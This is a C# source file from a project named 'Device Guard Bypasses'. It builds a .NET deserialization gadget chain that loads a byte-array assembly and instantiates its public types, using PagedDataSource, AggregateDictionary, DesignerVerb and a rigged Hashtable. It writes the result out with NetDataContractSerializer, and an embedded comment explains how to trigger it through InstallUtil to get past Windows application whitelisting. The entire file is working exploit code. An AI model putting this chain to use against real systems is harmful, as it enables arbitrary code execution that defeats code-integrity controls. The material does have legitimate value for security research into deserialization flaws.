//  This file is part of Device Guard Bypasses
//
//  Device Guard Bypasses is free software: you can redistribute it 
//  and/or modify it under the terms of the GNU General Public License
//  as published by the Free Software Foundation, either version 3 of 
//  the License, or (at your option) any later version.
//
//  Foobar is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with Foobar.  If not, see<http://www.gnu.org/licenses/>.

using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.UI.WebControls;
using System.Xml;

namespace CommonLib
{
    public class Serializer
    {
        static T CreateDelegate<T>(MethodInfo mi)
        {
            return (T)(object)Delegate.CreateDelegate(typeof(T), mi);
        }

        static T CreateDelegate<T>(Type type, string name)
        {
            return CreateDelegate<T>(type.GetMethod(name));
        }

        static T CreateGetterDelegate<T>(Type type, string name)
        {
            return CreateDelegate<T>(type.GetProperty(name).GetMethod);
        }

        public static object CreateAssemblyLoader(byte[] assembly)
        {
            // Build a chain to map a byte array to creating an instance of a class.
            // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
            byte[][] data = new byte[1][];
            data[0] = assembly;
            var e1 = data.Select(Assembly.Load);
            var map_type = CreateDelegate<Func<Assembly, IEnumerable<Type>>>(typeof(Assembly), "GetTypes");
            var e2 = e1.SelectMany(map_type);
            var p = CreateGetterDelegate<Func<Type, bool>>(typeof(Type), "IsPublic");
            var e3 = e2.Where(p);
            var e4 = e3.Select(Activator.CreateInstance);

            // PagedDataSource maps an arbitrary IEnumerable to an ICollection
            PagedDataSource pds = new PagedDataSource() { DataSource = e4 };
            // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
            // Class is internal so need to use reflection.
            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

            // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
            DesignerVerb verb = new DesignerVerb("XYZ", null);
            // Need to insert IDictionary using reflection.
            typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

            // Pre-load objects, this ensures they're fixed up before building the hash table.
            List<object> ls = new List<object>();
            ls.Add(e1);
            ls.Add(e2);
            ls.Add(e3);
            ls.Add(e4);
            ls.Add(pds);
            ls.Add(verb);
            ls.Add(dict);

            Hashtable ht = new Hashtable();

            // Add two entries to table.
            ht.Add(verb, "Hello");
            ht.Add("Dummy", "Hello2");

            FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
            Array keys = (Array)fi_keys.GetValue(ht);
            FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
            for (int i = 0; i < keys.Length; ++i)
            {
                object bucket = keys.GetValue(i);
                object key = fi_key.GetValue(bucket);
                if (key is string)
                {
                    fi_key.SetValue(bucket, verb);
                    keys.SetValue(bucket, i);
                    break;
                }
            }

            fi_keys.SetValue(ht, keys);
            ls.Add(ht);

            return ls;
        }

        public static void SerializeToNetDataSerializer(string filename, object obj)
        {
            XmlWriterSettings settings = new XmlWriterSettings() { Indent = true };
            using (XmlWriter writer = XmlWriter.Create(filename, settings))
            {
                writer.WriteComment("Copy this file to mscorlib.InstallState in a directory, say c:\\dummy\r\nThen run the command \"InstallUtil /u /InstallStateDir=c:\\dummy /AssemblyName mscorlib\"");
                NetDataContractSerializer serializer = new NetDataContractSerializer();
                serializer.WriteObject(writer, obj);
            }
        }

        public static object DeserializeFromNetDataSerializer(string filename)
        {
            using (XmlReader reader = XmlReader.Create(filename))
            {
                NetDataContractSerializer serializer = new NetDataContractSerializer();
                return serializer.ReadObject(reader);
            }
        }

        public static byte[] SerializeToBytes(object obj)
        {
            MemoryStream stm = new MemoryStream();
            BinaryFormatter fmt = new BinaryFormatter();
            fmt.Serialize(stm, obj);
            return stm.ToArray();
        }

        public static object DeserializeFromBytes(byte[] ba)
        {
            MemoryStream stm = new MemoryStream(ba);
            BinaryFormatter fmt = new BinaryFormatter();
            return fmt.Deserialize(stm);
        }
    }
}
